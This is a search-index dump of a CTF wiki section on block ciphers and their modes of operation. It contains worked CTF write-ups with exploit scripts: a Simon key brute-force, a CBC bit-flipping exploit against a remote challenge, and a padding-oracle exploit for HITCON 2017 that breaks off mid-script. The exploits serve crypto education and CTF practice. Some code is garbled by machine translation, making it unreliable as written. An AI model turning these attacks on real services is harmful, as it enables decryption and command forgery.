structure"},{"location":"crypto/blockcipher/introduction/#overview_1","text":"The iterative structure is basically as follows, generally consisting of three parts Key replacement Round encryption function Round decryption function","title":"Overview"},{"location":"crypto/blockcipher/introduction/#round-function","text":"At present, the main functions of the round function are mainly the following design methods. Feistel Network, invented by Horst Feistel, one of the DES designers. DES Substitution-Permutation Network(SPN) AES Other programs","title":"Round Function"},{"location":"crypto/blockcipher/introduction/#key-expansion","text":"At present, there are many methods for key expansion. There is no perfect key expansion method. The basic principle is that each bit of the key affects multiple rounds of round keys as much as possible.","title":"Key Expansion"},{"location":"crypto/blockcipher/simon-speck/","text":"Simon and Speck Block Ciphers \u00b6 This is a set of sister lightweight encryption. Simon Block Cipher \u00b6 basic introduction \u00b6 The Simon block encryption algorithm was released by the NSA in June 2013 and was optimized primarily on the Hardware Implementation . Simon Block Cipher is a balanced [Feistel cipher] ( https://en.wikipedia.org/wiki/Feistel_cipher ) encryption. There are two blocks. If the size of each block is n bits, the size of the plaintext is 2n bits. Further, in general, the key length used in the encryption is an integer multiple of the block length, such as 2n, 4n, and the like. Common Simon encryption algorithms are available In general, the Simon algorithm is called Simon 2 n /nm, where n is the block size and m is the multiple between the block size and the key. For example, Simon 48/96 means that the text is 48 bits and the key is a 96-bit encryption algorithm. In addition, for the Simon block encryption algorithm, the encryption process is the same for each round, as follows Of course, the keys will be different for each round and for different m. Where z_j z_j is generated by the Linear Feedback Shift Register (LFSR), although the logic for the different z_j z_j is different, the initial vector is fixed. | Constant | | :--------------------------------------: | | $ z_ {0} $ = 11111010001001010110000111001101111101000100101011000011100110 | | $ z_ {1} $ = 10001110111110010011000010110101000111011111001001100001011010 | | $ z_ {2} $ = 10101111011100000011010010011000101000010001111110010110110011 | | $ z_ {3} $ = 11011011101011000110010111100000010010001010011100110100001111 | | $ z_ {4} $ = 11010001111001101011011000100000010111000011001010010011101111 | 2017 SECCON Simon and Speck Block Ciphers \u00b6 The title is described below Simon and Speck Block Ciphers https://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5 It can be seen from the name that the key is 96 bits (12 bytes), the plaintext is 64 bits (8 bytes), and the key has been given 8 bytes, leaving only four bytes unknown. Then we can use the method of brute force. Here is a simon encryption algorithm from https://github.com/bozhu/NSA-ciphers/blob/master/simon.py . details as follows from pwn import * from simon import SIMON plain = 0x6d564d37426e6e71 cipher = 0xbb5d12ba422834b5 def compare ( key ): key = \"SECCON{\" + key + \"}\" key = key . encode ( 'hex' ) key = int ( key , 16 ) my_simon = SIMON ( 64 , 96 , key ) test = my_simon . encrypt ( plain ) if test == cipher : return True else : return False def solve (): visible = string . uppercase + string . lowercase + string . digits + string . punctuation + \" \" key = pwnlib . util . iters . mbruteforce ( compare , visible , 4 , method = & quot ; fixed & quot ;) print key if __name__ == \"__main__\" : solve () Results are as follows \u279c 2017_seccon_simon_and_speck_block_ciphers git: ( master ) python exp.py [ + ] MBruteforcing: Found key: \"6Pz0\" references \u00b6 https://en.wikipedia.org/wiki/Simon_(cipher )","title":"Simon and Speck"},{"location":"crypto/blockcipher/simon-speck/#simon-and-speck-block-ciphers","text":"This is a set of sister lightweight encryption.","title":"Simon and Speck Block Ciphers"},{"location":"crypto/blockcipher/simon-speck/#simon-block-cipher","text":"","title":"Simon Block Cipher"},{"location":"crypto/blockcipher/simon-speck/#basic-introduction","text":"The Simon block encryption algorithm was released by the NSA in June 2013 and was optimized primarily on the Hardware Implementation . Simon Block Cipher is a balanced [Feistel cipher] ( https://en.wikipedia.org/wiki/Feistel_cipher ) encryption. There are two blocks. If the size of each block is n bits, the size of the plaintext is 2n bits. Further, in general, the key length used in the encryption is an integer multiple of the block length, such as 2n, 4n, and the like. Common Simon encryption algorithms are available In general, the Simon algorithm is called Simon 2 n /nm, where n is the block size and m is the multiple between the block size and the key. For example, Simon 48/96 means that the text is 48 bits and the key is a 96-bit encryption algorithm. In addition, for the Simon block encryption algorithm, the encryption process is the same for each round, as follows Of course, the keys will be different for each round and for different m. Where z_j z_j is generated by the Linear Feedback Shift Register (LFSR), although the logic for the different z_j z_j is different, the initial vector is fixed. | Constant | | :--------------------------------------: | | $ z_ {0} $ = 11111010001001010110000111001101111101000100101011000011100110 | | $ z_ {1} $ = 10001110111110010011000010110101000111011111001001100001011010 | | $ z_ {2} $ = 10101111011100000011010010011000101000010001111110010110110011 | | $ z_ {3} $ = 11011011101011000110010111100000010010001010011100110100001111 | | $ z_ {4} $ = 11010001111001101011011000100000010111000011001010010011101111 |","title":"basic introduction"},{"location":"crypto/blockcipher/simon-speck/#2017-seccon-simon-and-speck-block-ciphers","text":"The title is described below Simon and Speck Block Ciphers https://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5 It can be seen from the name that the key is 96 bits (12 bytes), the plaintext is 64 bits (8 bytes), and the key has been given 8 bytes, leaving only four bytes unknown. Then we can use the method of brute force. Here is a simon encryption algorithm from https://github.com/bozhu/NSA-ciphers/blob/master/simon.py . details as follows from pwn import * from simon import SIMON plain = 0x6d564d37426e6e71 cipher = 0xbb5d12ba422834b5 def compare ( key ): key = \"SECCON{\" + key + \"}\" key = key . encode ( 'hex' ) key = int ( key , 16 ) my_simon = SIMON ( 64 , 96 , key ) test = my_simon . encrypt ( plain ) if test == cipher : return True else : return False def solve (): visible = string . uppercase + string . lowercase + string . digits + string . punctuation + \" \" key = pwnlib . util . iters . mbruteforce ( compare , visible , 4 , method = & quot ; fixed & quot ;) print key if __name__ == \"__main__\" : solve () Results are as follows \u279c 2017_seccon_simon_and_speck_block_ciphers git: ( master ) python exp.py [ + ] MBruteforcing: Found key: \"6Pz0\"","title":"2017 SECCON Simon and Speck Block Ciphers"},{"location":"crypto/blockcipher/simon-speck/#references","text":"https://en.wikipedia.org/wiki/Simon_(cipher )","title":"references"},{"location":"crypto/blockcipher/mode/cbc/","text":"CBC \u00b6 CBC is called the Cipher-block chaining mode, here IV does not require confidentiality IV must be unpredictable and must be complete. Encryption \u00b6 decryption \u00b6 Advantages and disadvantages \u00b6 Advantages \u00b6 The ciphertext block is not only related to the current ciphertext block, but also related to the previous ciphertext block or IV, hiding the statistical properties of the plaintext. Has a limited two-step error propagation feature, that is, a one-bit change in the ciphertext block only affects the current ciphertext block and the next ciphertext block. With self-synchronization feature, that is, the k-th block is correct, the k+1th block can be decrypted normally. Disadvantages \u00b6 Encryption cannot be parallel, decryption can be parallel. Application \u00b6 CBC is widely used Common data encryption and TLS encryption. Integrity and identity authentication. Attack \u00b6 Byte reversal attack \u00b6 Principle \u00b6 The principle of byte inversion is very simple, we observe the decryption process can find the following characteristics: IV vector affects the first plaintext grouping The nth ciphertext packet can affect the n + 1 plaintext packet Assuming that the n n ciphertext is grouped as C_n C_n , the decrypted n n plaintext is grouped as P_n P_n . Then P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) . The f f function is \\text{Block Cipher Decryption} \\text{Block Cipher Decryption} in the figure. For the original text and ciphertext of a certain information, then we can modify the n n ciphertext block C_n C_n to C_n~\\text{xor}~P_{n+1}~\\text{xor}~ A C_n~\\text{xor}~P_{n+1}~\\text{xor}~ A . Then decrypt the ciphertext, then the decrypted n n plaintext will soon become A A . Example \u00b6 from flag import FLAG from Crypto.Cipher import AES from Crypto import Random import base64 BLOCK_SIZE = 16 IV = Random . new () . read ( BLOCK_SIZE ) passphrase = Random . new () . read ( BLOCK_SIZE ) pad = lambda s : s + ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) * chr ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) unpad = lambda s : s [: - ord ( s [ len ( s ) - 1 :])] prefix = \"flag=\" + FLAG + \"&userdata=\" suffix = \"&user=guest\" def menu (): print \"1. encrypt\" print \"2. decrypt\" return raw_input ( \"> \" ) def encrypt (): data = raw_input ( \"your data: \" ) plain = prefix + data + suffix aes = AES . new ( passphrase , AES . MODE_CBC , IV ) print base64 . b64encode ( aes . encrypt ( pad ( plain ))) def decrypt (): data = raw_input ( \"input data: \" ) aes = AES . new ( passphrase , AES . MODE_CBC , IV ) plain = unpad ( aes . decrypt ( base64 . b64decode ( data ))) print 'DEBUG ====> ' + plain if plain [ - 5 :] == \"admin\" : print plain else : print \"you are not admin\" def main (): for _ in range ( 10 ): cmd = menu () if cmd == \"1\" : encrypt () elif cmd == & quot ; 2 & quot ;: decrypt () else : exit () if __name__ == \"__main__\" : main () Visible topic I hope we provide an encrypted string, if the final content of this string is admin. The program will output clear text. Therefore, the problem flow is to provide a plain text first, and then modify the ciphertext so that the final content of the decrypted string is admin. We can enumerate the length of the flag to determine where we need to modify it. The following is exp.py from pwn import * import base64 pad = 16 data = 'a' * pad for x in range ( 10 , 100 ): r = remote ( 'xxx.xxx.xxx.xxx' , 10004 ) #r = process('./chall.sh') r . sendlineafter ( '> ' , '1' ) r . sendlineafter ( 'your data: ' , data ) cipher = list ( base64 . b64decode ( r . recv ())) #print 'cipher ===>', ''.join(cipher) BLOCK_SIZE = 16 prefix = \"flag=\" + 'a' * x + \"&userdata=\" suffix = \"&user=guest\" plain = prefix + data + suffix idx = ( 22 + x + pad ) % BLOCK_SIZE + (( 22 + x + pad ) / BLOCK_SIZE - 1 ) * BLOCK_SIZE cipher [ idx + 0 ] = chr ( ord ( cipher [ idx + 0 ]) ^ ord ( 'g' ) ^ ord ( 'a' )) cipher [ idx + 1 ] = chr ( ord ( cipher [ idx + 1 ]) ^ ord ( 'u' ) ^ ord ( 'd' )) cipher [ idx + 2 ] = chr ( ord ( cipher [ idx + 2 ]) ^ ord ( 'e' ) ^ ord ( 'm' )) cipher [ idx + 3 ] = chr ( ord ( cipher [ idx + 3 ]) ^ ord ( 's' ) ^ ord ( 'i' )) cipher [ idx + 4 ] = chr ( ord ( cipher [ idx + 4 ]) ^ ord ( 't' ) ^ ord ( 'n' )) r . sendlineafter ( '> ' , '2' ) r . sendlineafter ( 'input data: ' , base64 . b64encode ( '' . join ( cipher ))) msg = r . recvline () if 'you are not admin' not in msg : print msg break r . close () Padding Oracle Attack \u00b6 See the introduction below for details.","title":"CBC"},{"location":"crypto/blockcipher/mode/cbc/#cbc","text":"CBC is called the Cipher-block chaining mode, here IV does not require confidentiality IV must be unpredictable and must be complete.","title":"CBC"},{"location":"crypto/blockcipher/mode/cbc/#encryption","text":"","title":"Encryption"},{"location":"crypto/blockcipher/mode/cbc/#decryption","text":"","title":"decryption"},{"location":"crypto/blockcipher/mode/cbc/#advantages-and-disadvantages","text":"","title":"Advantages and disadvantages"},{"location":"crypto/blockcipher/mode/cbc/#advantages","text":"The ciphertext block is not only related to the current ciphertext block, but also related to the previous ciphertext block or IV, hiding the statistical properties of the plaintext. Has a limited two-step error propagation feature, that is, a one-bit change in the ciphertext block only affects the current ciphertext block and the next ciphertext block. With self-synchronization feature, that is, the k-th block is correct, the k+1th block can be decrypted normally.","title":"Advantages"},{"location":"crypto/blockcipher/mode/cbc/#disadvantages","text":"Encryption cannot be parallel, decryption can be parallel.","title":"Disadvantages"},{"location":"crypto/blockcipher/mode/cbc/#application","text":"CBC is widely used Common data encryption and TLS encryption. Integrity and identity authentication.","title":"Application"},{"location":"crypto/blockcipher/mode/cbc/#attack","text":"","title":"Attack"},{"location":"crypto/blockcipher/mode/cbc/#byte-reversal-attack","text":"","title":"Byte reversal attack"},{"location":"crypto/blockcipher/mode/cbc/#principle","text":"The principle of byte inversion is very simple, we observe the decryption process can find the following characteristics: IV vector affects the first plaintext grouping The nth ciphertext packet can affect the n + 1 plaintext packet Assuming that the n n ciphertext is grouped as C_n C_n , the decrypted n n plaintext is grouped as P_n P_n . Then P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) . The f f function is \\text{Block Cipher Decryption} \\text{Block Cipher Decryption} in the figure. For the original text and ciphertext of a certain information, then we can modify the n n ciphertext block C_n C_n to C_n~\\text{xor}~P_{n+1}~\\text{xor}~ A C_n~\\text{xor}~P_{n+1}~\\text{xor}~ A . Then decrypt the ciphertext, then the decrypted n n plaintext will soon become A A .","title":"Principle"},{"location":"crypto/blockcipher/mode/cbc/#example","text":"from flag import FLAG from Crypto.Cipher import AES from Crypto import Random import base64 BLOCK_SIZE = 16 IV = Random . new () . read ( BLOCK_SIZE ) passphrase = Random . new () . read ( BLOCK_SIZE ) pad = lambda s : s + ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) * chr ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) unpad = lambda s : s [: - ord ( s [ len ( s ) - 1 :])] prefix = \"flag=\" + FLAG + \"&userdata=\" suffix = \"&user=guest\" def menu (): print \"1. encrypt\" print \"2. decrypt\" return raw_input ( \"> \" ) def encrypt (): data = raw_input ( \"your data: \" ) plain = prefix + data + suffix aes = AES . new ( passphrase , AES . MODE_CBC , IV ) print base64 . b64encode ( aes . encrypt ( pad ( plain ))) def decrypt (): data = raw_input ( \"input data: \" ) aes = AES . new ( passphrase , AES . MODE_CBC , IV ) plain = unpad ( aes . decrypt ( base64 . b64decode ( data ))) print 'DEBUG ====> ' + plain if plain [ - 5 :] == \"admin\" : print plain else : print \"you are not admin\" def main (): for _ in range ( 10 ): cmd = menu () if cmd == \"1\" : encrypt () elif cmd == & quot ; 2 & quot ;: decrypt () else : exit () if __name__ == \"__main__\" : main () Visible topic I hope we provide an encrypted string, if the final content of this string is admin. The program will output clear text. Therefore, the problem flow is to provide a plain text first, and then modify the ciphertext so that the final content of the decrypted string is admin. We can enumerate the length of the flag to determine where we need to modify it. The following is exp.py from pwn import * import base64 pad = 16 data = 'a' * pad for x in range ( 10 , 100 ): r = remote ( 'xxx.xxx.xxx.xxx' , 10004 ) #r = process('./chall.sh') r . sendlineafter ( '> ' , '1' ) r . sendlineafter ( 'your data: ' , data ) cipher = list ( base64 . b64decode ( r . recv ())) #print 'cipher ===>', ''.join(cipher) BLOCK_SIZE = 16 prefix = \"flag=\" + 'a' * x + \"&userdata=\" suffix = \"&user=guest\" plain = prefix + data + suffix idx = ( 22 + x + pad ) % BLOCK_SIZE + (( 22 + x + pad ) / BLOCK_SIZE - 1 ) * BLOCK_SIZE cipher [ idx + 0 ] = chr ( ord ( cipher [ idx + 0 ]) ^ ord ( 'g' ) ^ ord ( 'a' )) cipher [ idx + 1 ] = chr ( ord ( cipher [ idx + 1 ]) ^ ord ( 'u' ) ^ ord ( 'd' )) cipher [ idx + 2 ] = chr ( ord ( cipher [ idx + 2 ]) ^ ord ( 'e' ) ^ ord ( 'm' )) cipher [ idx + 3 ] = chr ( ord ( cipher [ idx + 3 ]) ^ ord ( 's' ) ^ ord ( 'i' )) cipher [ idx + 4 ] = chr ( ord ( cipher [ idx + 4 ]) ^ ord ( 't' ) ^ ord ( 'n' )) r . sendlineafter ( '> ' , '2' ) r . sendlineafter ( 'input data: ' , base64 . b64encode ( '' . join ( cipher ))) msg = r . recvline () if 'you are not admin' not in msg : print msg break r . close ()","title":"Example"},{"location":"crypto/blockcipher/mode/cbc/#padding-oracle-attack","text":"See the introduction below for details.","title":"Padding Oracle Attack"},{"location":"crypto/blockcipher/mode/cfb/","text":"CFB \u00b6 The CFB is called the Cipher feedback. Encryption \u00b6 decryption \u00b6 Advantages and disadvantages \u00b6 Advantages \u00b6 Adapt to different data format requirements Limited error propagation Self synchronization Disadvantages \u00b6 Encryption cannot be parallelized, decryption cannot be parallel Application Scenario \u00b6 This mode is suitable for database encryption, wireless communication encryption and other encryption environments that have special requirements on data formats. topic \u00b6 HITCONCTF-Quals-2015-Simple- (Crypto-100)","title":"CFB"},{"location":"crypto/blockcipher/mode/cfb/#cfb","text":"The CFB is called the Cipher feedback.","title":"CFB"},{"location":"crypto/blockcipher/mode/cfb/#encryption","text":"","title":"Encryption"},{"location":"crypto/blockcipher/mode/cfb/#decryption","text":"","title":"decryption"},{"location":"crypto/blockcipher/mode/cfb/#advantages-and-disadvantages","text":"","title":"Advantages and disadvantages"},{"location":"crypto/blockcipher/mode/cfb/#advantages","text":"Adapt to different data format requirements Limited error propagation Self synchronization","title":"Advantages"},{"location":"crypto/blockcipher/mode/cfb/#disadvantages","text":"Encryption cannot be parallelized, decryption cannot be parallel","title":"Disadvantages"},{"location":"crypto/blockcipher/mode/cfb/#application-scenario","text":"This mode is suitable for database encryption, wireless communication encryption and other encryption environments that have special requirements on data formats.","title":"Application Scenario"},{"location":"crypto/blockcipher/mode/cfb/#topic","text":"HITCONCTF-Quals-2015-Simple- (Crypto-100)","title":"topic"},{"location":"crypto/blockcipher/mode/ctr/","text":"CTR \u00b6 The CTR is called the Counter mode, which is designed by Diffe and Hellman. Encryption \u00b6 decryption \u00b6 topic \u00b6 2017 star ctf ssss 2017 star ctf ssss2","title":"CTR"},{"location":"crypto/blockcipher/mode/ctr/#ctr","text":"The CTR is called the Counter mode, which is designed by Diffe and Hellman.","title":"CTR"},{"location":"crypto/blockcipher/mode/ctr/#encryption","text":"","title":"Encryption"},{"location":"crypto/blockcipher/mode/ctr/#decryption","text":"","title":"decryption"},{"location":"crypto/blockcipher/mode/ctr/#topic","text":"2017 star ctf ssss 2017 star ctf ssss2","title":"topic"},{"location":"crypto/blockcipher/mode/ecb/","text":"ECB \u00b6 The ECB mode is called the electronic codebook mode. Encryption \u00b6 decryption \u00b6 Advantages and disadvantages \u00b6 Advantages \u00b6 Simple to implement. Encryption of different plaintext packets can be calculated in parallel, which is fast. Disadvantages \u00b6 The same plaintext block will be encrypted into the same ciphertext block, and the statistical rules of the plaintext grouping will not be hidden. As shown below In order to solve the problem that the unified plaintext generates the same ciphertext, other encryption modes are proposed. typical application \u00b6 Encryption protection for random numbers. Encryption for single-packet plaintext. 2016 ABCTF aes-mess-75 \u00b6 The title is described below We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this? [HINT] There has to be some way to work backwards, right? It can be seen that this encryption is an ECB encryption, then AES is a group of 16 bytes, each byte can be represented by two hexadecimal characters, so we group each 32 characters and then correspond Search in the txt file. Corresponding flag e220eb994c8fc16388dbd60a969d4953 abctf{looks_like f042fc0bce25dbef573cf522636a1ba3 _you_can_break_a fafa1a7c21ff824a5824c5dc4a376e75 is} The last one is obviously padding when it is encrypted. topic \u00b6 2018 PlaidCTF macsh","title":"ECB"},{"location":"crypto/blockcipher/mode/ecb/#ecb","text":"The ECB mode is called the electronic codebook mode.","title":"ECB"},{"location":"crypto/blockcipher/mode/ecb/#encryption","text":"","title":"Encryption"},{"location":"crypto/blockcipher/mode/ecb/#decryption","text":"","title":"decryption"},{"location":"crypto/blockcipher/mode/ecb/#advantages-and-disadvantages","text":"","title":"Advantages and disadvantages"},{"location":"crypto/blockcipher/mode/ecb/#advantages","text":"Simple to implement. Encryption of different plaintext packets can be calculated in parallel, which is fast.","title":"Advantages"},{"location":"crypto/blockcipher/mode/ecb/#disadvantages","text":"The same plaintext block will be encrypted into the same ciphertext block, and the statistical rules of the plaintext grouping will not be hidden. As shown below In order to solve the problem that the unified plaintext generates the same ciphertext, other encryption modes are proposed.","title":"Disadvantages"},{"location":"crypto/blockcipher/mode/ecb/#typical-application","text":"Encryption protection for random numbers. Encryption for single-packet plaintext.","title":"typical application"},{"location":"crypto/blockcipher/mode/ecb/#2016-abctf-aes-mess-75","text":"The title is described below We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this? [HINT] There has to be some way to work backwards, right? It can be seen that this encryption is an ECB encryption, then AES is a group of 16 bytes, each byte can be represented by two hexadecimal characters, so we group each 32 characters and then correspond Search in the txt file. Corresponding flag e220eb994c8fc16388dbd60a969d4953 abctf{looks_like f042fc0bce25dbef573cf522636a1ba3 _you_can_break_a fafa1a7c21ff824a5824c5dc4a376e75 is} The last one is obviously padding when it is encrypted.","title":"2016 ABCTF aes-mess-75"},{"location":"crypto/blockcipher/mode/ecb/#topic","text":"2018 PlaidCTF macsh","title":"topic"},{"location":"crypto/blockcipher/mode/introduction/","text":"\u7ec4\u6a21\u5f0f \u00b6 Packet encryption divides the plaintext message into fixed-size blocks, and each block of plaintext is encrypted into ciphertext under key control. Of course not every message is an integer multiple of the corresponding block size, so we may need to do the padding.","title":"Introduction"},{"location":"crypto/blockcipher/mode/introduction/#_1","text":"Packet encryption divides the plaintext message into fixed-size blocks, and each block of plaintext is encrypted into ciphertext under key control. Of course not every message is an integer multiple of the corresponding block size, so we may need to do the padding.","title":"\u7ec4\u6a21\u5f0f"},{"location":"crypto/blockcipher/mode/ofb/","text":"OFB \u00b6 OFB is called output feedback mode, and its feedback content is packet-encrypted content instead of ciphertext. Encryption \u00b6 decryption \u00b6 Advantages and disadvantages \u00b6 Advantages \u00b6 Does not have error propagation characteristics. Disadvantages \u00b6 IV does not require confidentiality, but a different IV must be chosen for each message. Does not have self-synchronization capability. Applicable scene \u00b6 Applicable to some scenarios where the plaintext redundancy is relatively large, such as image encryption and voice encryption.","title":"OFB"},{"location":"crypto/blockcipher/mode/ofb/#ofb","text":"OFB is called output feedback mode, and its feedback content is packet-encrypted content instead of ciphertext.","title":"OFB"},{"location":"crypto/blockcipher/mode/ofb/#encryption","text":"","title":"Encryption"},{"location":"crypto/blockcipher/mode/ofb/#decryption","text":"","title":"decryption"},{"location":"crypto/blockcipher/mode/ofb/#advantages-and-disadvantages","text":"","title":"Advantages and disadvantages"},{"location":"crypto/blockcipher/mode/ofb/#advantages","text":"Does not have error propagation characteristics.","title":"Advantages"},{"location":"crypto/blockcipher/mode/ofb/#disadvantages","text":"IV does not require confidentiality, but a different IV must be chosen for each message. Does not have self-synchronization capability.","title":"Disadvantages"},{"location":"crypto/blockcipher/mode/ofb/#applicable-scene","text":"Applicable to some scenarios where the plaintext redundancy is relatively large, such as image encryption and voice encryption.","title":"Applicable scene"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/","text":"Padding Oracle Attack \u00b6 Introduction \u00b6 Padding Oracle Attack attacks generally need to meet the following conditions Encryption Algorithm Encryption algorithm using PKCS5 Padding. Of course, the way OAEP is filled in asymmetric encryption may also be affected. The grouping mode is CBC mode. Attacker ability An attacker can intercept messages encrypted by the above encryption algorithm. The attacker can interact with the padding oracle (the server): the client sends the ciphertext to the server, and the server will use some kind of return information to inform the client whether the padding is normal. Padding Oracle Attack can achieve the following effects Decrypt any given ciphertext without knowing the key and IV. Principle \u00b6 The basic principles of the Padding Oracle Attack attack are as follows Decrypt a very long message piece by piece. For each message, first decrypt the last byte of the message, then decrypt the second to last byte, and so on. Here we review the CBC Encryption $$ C_i=E_K(P_i \\oplus C_{i-1})\\ IV = C_0 $$ Decryption $$ P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\ C_{0}=IV $$ We mainly focus on decryption, we don't know IV and key here. Here we assume that the length of the ciphertext block is n bytes. Suppose we intercepted ciphertext Y to obtain the last byte of ciphertext Y as an example for analysis. In order to obtain the content of Y, we first need to forge a piece of ciphertext F so that the last byte of the plaintext corresponding to Y can be modified. This is because if we construct the ciphertext F|Y , then the decryption Y is specifically $$ P = D_K (Y) oplus F $$ So modify the last byte of ciphertext F, F_{n} F_{n} , to modify the last byte of the plaintext corresponding to Y. The process of getting the last byte of P is given below. i=0, set each byte of F to be random byte . Set F_n=i \\oplus 0x01 F_n=i \\oplus 0x01 Send F|Y to the server. If the last byte of P is i, then the last padding is 0x01 and no error will occur. Otherwise, only the last P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 bytes of P are P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 and no error will be reported. Also, note that the padding bytes can only be 0 to n. Therefore, if you want to make the error in the case of F randomly and satisfy the padding byte size, the probability is small**. So in the case of no error on the server side, we can think that we did get the correct bytes. In the event of an error, i=i+1, jump to 2. After getting the last byte of P, we can continue to get the second-to-last byte of P. In this case, we need to set F_n=P_n\\oplus 0x02 F_n=P_n\\oplus 0x02 and set F_{n-1}=i \\oplus 0x02 F_{n-1}=i \\oplus 0x02 to enumerate i. So, in summary, Padding Oracle Attack is actually a method of attack with a high probability of success. However, it's important to note that some of the real-world problems that are often encountered are not the standard Padding Oracle Attack mode, and we often need to make some changes. 2017 HITCON Secret Server \u00b6 Analysis \u00b6 The encryption used in the program is AES CBC, which uses padding similar to PKCS5. def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] However, in each unpad, no detection is performed, but the unpad is directly executed. Among them, it should be noted that the function that interacts with the user each time is send_msg , accepts the user's plaintext, encrypts it with a fixed 2jpmLoSsOlQrqyqE , and outputs the encrypted result. recv_msg , accepts the user's IV and ciphertext, decrypts the ciphertext, and returns. There will be different actions depending on the results returned. msg = recv_msg () . strip () if msg . startswith ( 'exit-here' ): exit ( 0 ) elif msg . startswith ( 'get-flag' ): send_msg ( flag ) elif msg . startswith ( 'get-md5' ): send_msg ( MD5 . new ( msg [ 7 :]) . digest ()) elif msg . startswith ( 'get-time' ): send_msg ( str ( time . time ())) elif msg . startswith ( 'get-sha1' ): send_msg ( SHA . new ( msg [ 8 :]) . digest ()) elif msg . startswith ( 'get-sha256' ): send_msg ( SHA256 . new ( msg [ 10 :]) . digest ()) elif msg . startswith ( 'get-hmac' ): send_msg ( HMAC . new ( msg [ 8 :]) . digest ()) else : send_msg ( 'command not found' ) Main Vulnerabilities \u00b6 Here we briefly summarize the parts we have. Encryption The IV when encrypting is fixed and known. 'Welcome!!' Encrypted result. Decryption We can control IV. First of all, since we know the result of the Welcome!! encryption, we can also control the IV in recv_msg, then according to the decryption process $$ P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\ C_{0}=IV $$ If we enter the encrypted result of Welcome!! into recv_msg, the result of direct decryption is (Welcome!!+&#39;\\x07&#39;*7) xor iv , if we properly control the decryption process In the iv passed, then we can control the decrypted result. In other words, we can execute any of the commands described above**. Thus, we can also know the result of the flag decryption. Secondly, on the above basis, if we add the custom IV and Welcome encrypted result after any ciphertext C and pass it to recv_msg as input, then we can control the last byte of the message after decryption. So due to the unpad operation, we can control the length of the decrypted message to be reduced from 0 to 255 . Using ideas \u00b6 Basic use ideas are as follows Bypass proof of work 2. Obtain the encrypted flag according to the way you execute any command. 3. Since the beginning of the flag is hitcon{ , there are 7 bytes in total, so we can still control the iv to make the first 7 bytes after decryption the specified byte. This allows us to execute the get-md5 command on the decrypted message. According to the unpad operation, we can control the decrypted message exactly at the first few bytes of the message. So we can start controlling the decrypted message as hitcon{x , that is, only one byte after hitcon{ . This will result in an encrypted result with a one-byte hash. Similarly, we can also get the result of the encryption with a byte hash. 4. In this case, we can blast locally byte by byte, calculate the corresponding md5 , and then use the arbitrary command execution mode to control the decrypted plaintext to any specified command. If the control is unsuccessful, it means that the byte is incorrect. , need to blast again; if it is correct, then you can directly execute the corresponding command. The specific code is as follows #coding=utf-8 from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' if args [ 'REMOTE' ]: p = remote ( '52.193.157.19' , 9999 ) else : p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): Return msg [: - ord ( msg [ - 1 ])] # Remove the pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) p . recvuntil ( 'Done! \\n ' ) iv_encrypt = '2jpmLoSsOlQrqyqE' def getmd5enc ( i , cipher_flag , cipher_welcome ): \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\" ## keep iv[7:] do not change, so decrypt won't change new_iv = flipplain ( & quot ; hitcon { & quot ; . bright ( 16 , & quot ; x00 & quot ;), & quot ; get - md5 & quot ; . light ( 16 , ' \\x00 ' ), iv_encrypt ) payload = new_iv + cipher_flag ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_flag ) + 16 + 16 - ( 7 + i + 1 )), iv_encrypt ) payload += last_byte_iv + cipher_welcome p . sendline ( base64 . b64encode ( payload )) return p . recvuntil ( \" \\n \" , drop = True ) def main (): bypassproof () # result of encrypted Welcome!! cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_welcome = base64 . b64decode ( cipher )[ 16 :] log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-flag get_flag_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-flag\" 